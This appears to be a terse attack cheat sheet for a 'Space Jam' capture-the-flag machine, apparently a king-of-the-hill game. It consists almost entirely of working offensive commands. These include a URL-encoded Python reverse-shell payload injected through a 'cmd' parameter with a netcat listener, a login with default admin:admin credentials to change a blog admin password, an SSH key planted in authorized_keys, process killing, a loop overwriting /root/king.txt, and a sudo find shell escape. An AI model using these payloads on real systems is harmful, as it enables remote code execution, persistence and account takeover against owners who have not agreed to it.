Space Jam

## Instant root
`"<REMOTE_IP>:3000/?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<REMOTE IP>%22%2C5566%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"` and `nc -nlvp 5566`

- `ps aux | grep python` then `kill PYTHON3 easythingy`

- Go to `http://IP/local/fantasticblog/blogadmin/admin/pageSettings.php`, login `admin:admin`, change password

- You are alone now!

# Alternatives:

- `nc IP 61432`

- `echo "SSHKEY" > .ssh/authorized_keys`

- on your machine: `ssh jordan@IP`

- `ps aux` + `kill PID` for that process

- `while true; do echo "$USERNAME" | cp /dev/stdin /root/king.txt; sleep 0.1; done &`

- `sudo find . -exec /bin/sh \; -quit`